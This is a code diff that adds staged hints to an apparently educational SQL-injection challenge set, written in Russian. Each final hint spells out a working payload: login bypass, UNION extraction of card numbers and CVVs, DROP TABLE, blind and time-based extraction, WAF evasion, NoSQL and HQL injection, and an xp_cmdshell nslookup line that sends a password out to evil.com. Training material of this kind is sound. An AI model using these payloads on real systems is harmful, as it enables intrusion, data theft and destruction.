@@ -605,6 +605,11 @@ export const sqlChallenges = [
     description: 'Войдите в систему без знания реального пароля, используя SQL-инъекцию в форме логина.',
     initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'\n  AND password = 'password123'`,
     hint: 'Попробуйте закрыть строку с помощью одинарной кавычки и добавить условие, которое всегда истинно.',
+    hints: [
+      'Обратите внимание на форму: username и password. Что если сделать условие всегда истинным?',
+      'Используйте одинарную кавычку чтобы закрыть строку username, затем добавьте OR с условием которое всегда true.',
+      "Введите: ' OR '1'='1",
+    ],
     exampleInput: "' OR '1'='1",
     explanation:
       'Ввод \\\' OR \\\'1\\\'=\\\'1 закрывает строку username и добавляет условие OR \\\'1\\\'=\\\'1\\\', которое всегда истинно. Это превращает запрос в: SELECT * FROM users WHERE username=\\\'\\\' OR \\\'1\\\'=\\\'1\\\' AND password=\\\'password123\\\'. Благодаря приоритету оператора AND, условие OR \\\'1\\\'=\\\'1\\\' оценивается первым, возвращая все строки.',
@@ -617,6 +622,11 @@ export const sqlChallenges = [
     description: 'Обойдите проверку пароля, используя SQL-комментарий для игнорирования оставшейся части запроса.',
     initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'\n  AND password = 'any'`,
     hint: 'Используйте символы -- (двойной дефис) для комментирования части запроса с паролем.',
+    hints: [
+      'SQL позволяет игнорировать часть запроса. Есть ли способ заставить СУБД проигнорировать проверку пароля?',
+      'Закройте строку username одинарной кавычкой, затем используйте -- для комментария всего что после.',
+      "Введите: admin'--",
+    ],
     exampleInput: "admin'--",
     explanation:
       'Ввод admin\\\'-- закрывает строку username, а -- превращает всё после в комментарий. Запрос становится: SELECT * FROM users WHERE username=\\\'admin\\\'-- AND password=\\\'any\\\'. Часть с паролем полностью игнорируется, и запрос возвращает данные пользователя admin.',
@@ -629,6 +639,11 @@ export const sqlChallenges = [
     description: 'Используйте UNION SELECT для извлечения данных из таблицы credit_cards.',
     initialQuery: `SELECT name, email FROM users\nWHERE name LIKE '%[ВВОД]%'`,
     hint: 'Закройте LIKE-выражение и добавьте UNION SELECT для выборки из другой таблицы. Количество столбцов должно совпадать.',
+    hints: [
+      'UNION позволяет объединить результаты двух SELECT-запросов. Подумайте, как добавить второй запрос после основного.',
+      'Закройте строку одинарной кавычкой, добавьте UNION SELECT с двумя столбцами из таблицы credit_cards, и закомментируйте остаток через --.',
+      "Введите: ' UNION SELECT card_number, cvv FROM credit_cards--",
+    ],
     exampleInput: "' UNION SELECT card_number, cvv FROM credit_cards--",
     explanation:
       'UNION объединяет результаты двух SELECT-запросов. Количество столбцов должно быть одинаковым. Комментарий -- скрывает остаток оригинального запроса. Результат: SELECT name, email FROM users WHERE name LIKE \\\'\\\' UNION SELECT card_number, cvv FROM credit_cards--%. Это возвращает данные о кредитных картах вместе с обычными результатами.',
@@ -641,6 +656,11 @@ export const sqlChallenges = [
     description: 'Используйте инъекцию для выполнения деструктивной операции — удалите таблицу.',
     initialQuery: `SELECT * FROM products\nWHERE id = [ВВОД]`,
     hint: 'Закройте числовое значение и добавьте точку с запятой для нового SQL-оператора.',
+    hints: [
+      'SQL позволяет выполнять несколько операторов подряд. Как разделить два разных SQL-запроса в одном?',
+      'После числа добавьте точку с запятой (;), затем напишите DROP TABLE products и закомментируйте остаток через --.',
+      "Введите: 1; DROP TABLE products;--",
+    ],
     exampleInput: "1; DROP TABLE products;--",
     explanation:
       'Точка с запятой позволяет выполнить несколько SQL-операторов в одном запросе. Ввод 1; DROP TABLE products;-- сначала выполняет SELECT, а затем DROP TABLE. Этот тип атаки особенно опасен, так как приводит к полной потере данных. Многие СУБД предотвращают множественные запросы, но не все.',
@@ -653,6 +673,11 @@ export const sqlChallenges = [
     description: 'Извлеките информацию о версии базы данных через сообщения об ошибках.',
     initialQuery: `SELECT * FROM users\nWHERE id = '[ВВОД]'`,
     hint: 'Попробуйте передать значение, которое вызовет ошибку преобразования типов, раскрывающую версию СУБД.',
+    hints: [
+      'Некоторые СУБД возвращают подробную информацию в сообщениях об ошибках. Можно ли заставить базу данных «выдать» свои данные через ошибку?',
+      'Используйте подзапрос с CONCAT и VERSION() внутри GROUP BY, что вызовет ошибку дублирования ключей, содержащую версию БД.',
+      "Введите: ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+    ],
     exampleInput: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
     explanation:
       'Error-based SQLi использует сообщения об ошибках СУБД для извлечения информации. Когда сервер возвращает ошибку с деталями запроса, злоумышленник может получить версию БД, имена таблиц и столбцов. GROUP BY с CONCAT и RAND вызывает дублирование ключей, что генерирует ошибку, содержащую нужные данные.',
@@ -665,6 +690,11 @@ export const sqlChallenges = [
     description: 'Определите, существует ли пользователь "admin", используя только ответы true/false от сервера.',
     initialQuery: `SELECT * FROM products\nWHERE name LIKE '%[ВВОД]%'`,
     hint: 'Используйте условие, которое возвращает разные результаты для true и false. SUBSTRING() поможет посимвольно извлечь данные.',
+    hints: [
+      'Blind SQLi не возвращает данные напрямую, но сервер по-разному реагирует на истинные и ложные условия. Как проверить предположение о данных?',
+      'Используйте SUBSTRING для извлечения символов из скрытых данных и сравните с ожидаемым значением через условие AND.',
+      "Введите: ' AND SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a'--",
+    ],
     exampleInput: "' AND SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a'--",
     explanation:
       'Blind SQLi не возвращает данные напрямую, но позволяет делать логические выводы. Если страница отображается нормально — условие истинно. Если контент изменён или отсутствует — ложно. Перебирая символы через SUBSTRING(), можно восстановить пароль посимвольно.',
@@ -677,6 +707,11 @@ export const sqlChallenges = [
     description: 'Используйте задержки (SLEEP) для определения уязвимости, когда сервер не возвращает видимых различий.',
     initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
     hint: 'Функция SLEEP(n) заставляет СУБД ждать n секунд. Используйте условную задержку: IF(condition, SLEEP(5), 0).',
+    hints: [
+      'Когда сервер не показывает разницы между true и false, можно использовать время ответа как сигнал. Как заставить сервер «задуматься» при определённом условии?',
+      'Оберните SLEEP в условную функцию IF: если первый символ пароля admin равен «a», то подождать 3 секунды.',
+      "Введите: ' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(3),0)--",
+    ],
     exampleInput: "' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(3),0)--",
     explanation:
       'Time-based SQLi — самый сложный тип blind-инъекций. Сервер всегда возвращает одинаковый ответ, но время ответа зависит от условия. Если задержка 3+ секунды — условие истинно. Это позволяет извлекать данные посимвольно, измеряя время ответа.',
@@ -689,6 +724,11 @@ export const sqlChallenges = [
     description: 'Внедрите SQL-инъекцию через регистрацию нового пользователя, которая сработает при изменении профиля.',
     initialQuery: `-- Сначала данные сохраняются:\nINSERT INTO users (username, email)\nVALUES ('[ВВОД]', 'user@test.com')\n\n-- Потом используются без санитизации:\nSELECT * FROM users\nWHERE username = 'сохранённое_значение'`,
     hint: 'При регистрации введите username, который при последующем использовании выполнит вредоносный SQL. Попробуйте: admin\\\'--',
+    hints: [
+      'Second-order SQLi работает в два этапа: сначала вредоносный код сохраняется в БД, а потом активируется при его использовании. Что нужно добавить к username, чтобы он «сломал» будущий запрос?',
+      'Закройте строку username одинарной кавычкой и добавьте комментарий --, чтобы при подстановке значения остаток запроса был закомментирован.',
+      "Введите: admin'--",
+    ],
     exampleInput: "admin'--",
     explanation:
       'Second-order SQLi происходит в два этапа: 1) Вредоносный payload сохраняется в БД через кажущийся безобидный ввод. 2) При последующем использовании этих данных (например, при поиске по username) payload активируется. Многие разработчики санитизируют ввод, но забывают о выходе данных.',
@@ -701,6 +741,11 @@ export const sqlChallenges = [
     description: 'Извлеките данные через внешний DNS-запрос, когда прямой ответ сервера недоступен.',
     initialQuery: `SELECT * FROM users\nWHERE id = [ВВОД]`,
     hint: 'Функция xp_cmdshell (MSSQL) или LOAD_FILE (MySQL) может инициировать DNS-запрос к контролируемому вами домену.',
+    hints: [
+      'Когда нельзя получить данные через обычный HTTP-ответ, можно заставить сервер отправить данные наружу через DNS-запрос. Как выполнить системную команду из SQL?',
+      'Используйте точку с запятой для разделения запросов, затем EXEC xp_cmdshell с nslookup, который отправит пароль на ваш домен evil.com.',
+      "Введите: 1; EXEC xp_cmdshell 'nslookup '+(SELECT TOP 1 password FROM users)+'.evil.com'--",
+    ],
     exampleInput: "1; EXEC xp_cmdshell 'nslookup '+(SELECT TOP 1 password FROM users)+'.evil.com'--",
     explanation:
       'Out-of-band SQLi используется, когда нельзя получить данные через HTTP-ответ. Злоумышленник заставляет сервер сделать DNS-запрос или HTTP-запрос к внешнему серверу, внедряя данные в доменное имя. Например, password123.evil.com в логах DNS показывает извлечённый пароль.',
@@ -713,6 +758,11 @@ export const sqlChallenges = [
     description: 'Обойдите Web Application Firewall, используя кодирование и обфускацию SQL-запроса.',
     initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
     hint: 'WAF блокирует ключевые слова SELECT, UNION. Попробуйте: HEX-кодирование строк, CONCAT для обхода фильтра ключевых слов, комментарии /**/ для разбивки.',
+    hints: [
+      'WAF ищет известные сигнатуры вроде SELECT и UNION. Как изменить написание этих слов, чтобы фильтр их не распознал, но СУБД поняла?',
+      'Используйте MySQL-специфичные комментарии /*!50000...*/ для обхода фильтрации, чередуйте регистр букв (UnIoN SeLeCt) и используйте CHAR() для строк.',
+      "Введите: '/*!50000UnIoN*//*!50000SeLeCt*/ 1,2,CHAR(97,100,109,105,110)--",
+    ],
     exampleInput: "'/*!50000UnIoN*//*!50000SeLeCt*/ 1,2,CHAR(97,100,109,105,110)--",
     explanation:
       'WAF использует сигнатурный анализ для блокировки SQL-инъекций. Обход возможен через: 1) Регистр: UnIoN SeLeCt. 2) Комментарии: /*!50000UNION*/ выполняется только в MySQL 5.0+. 3) HEX-кодирование: 0x61646d696e вместо \'admin\'. 4) CHAR(): CHAR(97,100,109,105,110) = \'admin\'. 5) URL-encoding: %27 вместо кавычки.',
@@ -725,6 +775,11 @@ export const sqlChallenges = [
     description: 'Создайте пейлоад, работающий в MySQL, PostgreSQL и SQLite одновременно.',
     initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
     hint: 'Polyglot-пейлоад должен использовать синтаксис, валидный во всех СУБД. Используйте: -- для комментариев (работает везде), UNION SELECT, 0x для hex.',
+    hints: [
+      'Polyglot SQLi — это универсальный пейлоад, работающий в MySQL, PostgreSQL и SQLite одновременно. Какие SQL-конструкции совместимы между всеми СУБД?',
+      'Используйте UNION SELECT с NULL (работает везде) и стандартный SQL-комментарий -- с пробелом после. Подберите количество NULL по числу столбцов.',
+      "Введите: 1' UNION SELECT NULL,NULL,NULL-- -",
+    ],
     exampleInput: "1' UNION SELECT NULL,NULL,NULL-- -",
     explanation:
       'Polyglot SQLi — пейлоад, работающий в нескольких СУБД. Ключевые принципы: 1) Двойной дефис с пробелом (-- ) — стандартный SQL-комментарий. 2) UNION SELECT NULL — NULL работает во всех СУБД. 3) Одинарная кавычка — стандартный разделитель строк. 4) Точное количество NULL определяется числом столбцов оригинального запроса.',
@@ -737,6 +792,11 @@ export const sqlChallenges = [
     description: 'Используйте операторы MongoDB ($gt, $ne) для обхода аутентификации в NoSQL базе данных.',
     initialQuery: `db.users.findOne({\n  username: '[ВВОД]',\n  password: 'password123'\n})`,
     hint: 'В MongoDB можно передавать объекты вместо строк. Попробуйте: {"$gt": ""} — это означает "больше пустой строки" и всегда истинно для строк.',
+    hints: [
+      'MongoDB принимает не только строки, но и объекты с операторами. Какой оператор означает «любое значение больше пустой строки»?',
+      'Вместо строки username передайте JSON-объект {"$gt": ""}. Это условие всегда истинно для любого непустого строкового значения.',
+      'Введите: {"$gt": ""}',
+    ],
     exampleInput: '{"$gt": ""}',
     explanation:
       'NoSQL Injection работает иначе, чем SQLi. Вместо строк передаются JSON-объекты с операторами MongoDB. {"$gt": ""} означает "любое значение больше пустой строки" — всегда true. Запрос становится: db.users.findOne({username: {"$gt": ""}, password: "password123"}), что возвращает первого пользователя. Защита: валидация типов данных (typeof === "string"), sanitization, mongoose schema validation.',
@@ -749,6 +809,11 @@ export const sqlChallenges = [
     description: 'Используйте инъекцию в параметре сортировки для извлечения данных через CASE-выражения.',
     initialQuery: `SELECT name, email, role FROM users\nORDER BY [ВВОД]`,
     hint: 'Параметр сортировки обычно не санитизируется. Используйте CASE WHEN для boolean-based extraction: CASE WHEN (condition) THEN name ELSE email END.',
+    hints: [
+      'Параметр ORDER BY часто забывают защитить. Как использовать условное выражение в сортировке для извлечения информации?',
+      'Напишите CASE WHEN с проверкой первого символа пароля admin. Если «a», то сортировка по name, иначе по email — порядок результатов выдаст ответ.',
+      "Введите: CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN name ELSE email END",
+    ],
     exampleInput: "CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN name ELSE email END",
     explanation:
       'ORDER BY injection — часто игнорируемый вектор. Разработатели санитизируют WHERE, но забывают о ORDER BY. Через CASE WHEN можно делать boolean-based extraction: если условие истинно, сортировка по name, иначе по email. Наблюдая порядок результатов, можно восстановить данные посимвольно.',
@@ -761,6 +826,11 @@ export const sqlChallenges = [
     description: 'SQL-инъекция через HTTP-заголовок, который сервер использует без санитизации.',
     initialQuery: `-- Сервер логирует IP из заголовка:\nINSERT INTO access_logs (ip, timestamp)\nVALUES ('[X-Forwarded-For]', NOW())`,
     hint: 'Заголовки HTTP часто не санитизируются. X-Forwarded-For, User-Agent, Referer — все могут содержать SQL-пейлоад.',
+    hints: [
+      'Сервер сохраняет значение заголовка X-Forwarded-For прямо в БД. Как внедрить SQL через значение, которое подставляется в INSERT?',
+      'Закройте строку IP одинарной кавычкой и подставьте подзапрос для SELECT пароля, завершив комментарием --.',
+      "Введите: 127.0.0.1', (SELECT password FROM users WHERE username='admin'))--",
+    ],
     exampleInput: "127.0.0.1', (SELECT password FROM users WHERE username='admin'))--",
     explanation:
       'HTTP Header SQLi: сервер использует X-Forwarded-For для определения IP клиента и сохраняет его в БД без санитизации. Злоумышленник устанавливает заголовок с SQL-пейлоадом. Часто встречается в логировании, геолокации, analytics. Защита: валидация всех входных данных, включая заголовки; параметризованные запросы.',
@@ -773,6 +843,11 @@ export const sqlChallenges = [
     description: 'Используйте инъекцию в HQL-запросе Java/Hibernate приложения для обхода аутентификации.',
     initialQuery: `// HQL запрос:\nQuery q = session.createQuery(\n  "from User where username='" + input + "'");`,
     hint: 'HQL не поддерживает комментарии (--), но поддерживает строковые литералы и concat(). Попробуйте закрыть строку и добавить OR.',
+    hints: [
+      'HQL (Hibernate Query Language) не позволяет использовать комментарии для обрезки запроса. Как сделать условие всегда истинным без комментариев?',
+      'Закройте строку username одинарной кавычкой и добавьте OR с пустым сравнением \'\'=\'\', которое всегда true.',
+      "Введите: ' or ''='",
+    ],
     exampleInput: "' or ''='",
     explanation:
       'HQL Injection — SQLi для Hibernate/Java. HQL не поддерживает комментарии и UNION, но поддерживает строковые операции. Пейлоад \' or \'\'=\' преобразует запрос в: from User where username=\'\' or \'\'=\'\', что возвращает всех пользователей. Ограничения HQL делают эксплуатацию сложнее, но не невозможной.',
@@ -785,6 +860,11 @@ export const sqlChallenges = [
     description: 'Используйте инъекцию в INSERT-запросе для создания аккаунта с произвольными правами.',
     initialQuery: `INSERT INTO users (username, email, role, active)\nVALUES ('[ВВОД]', 'user@test.com', 'user', 1)`,
     hint: 'Закройте строку username и добавьте значения для дополнительных колонок через запятую.',
+    hints: [
+      'INSERT-запрос добавляет запись с несколькими колонками. Как внедрить значения для колонок role и email, которые не доступны в форме?',
+      'Закройте строку username кавычкой, добавьте через запятую свой email, роль «admin» и 1, затем закомментируйте остаток запроса через --.',
+      "Введите: admin', 'admin@evil.com', 'admin', 1)--",
+    ],
     exampleInput: "admin', 'admin@evil.com', 'admin', 1)--",
     explanation:
       'INSERT SQLi: злоумышленник может модифицировать значения дополнительных колонок через инъекцию в первом поле. Введя admin\', \'admin@evil.com\', \'admin\', 1), он создаёт аккаунт с ролью admin. Даже если форма регистрации не содержит поле role, инъекция позволяет его установить.',
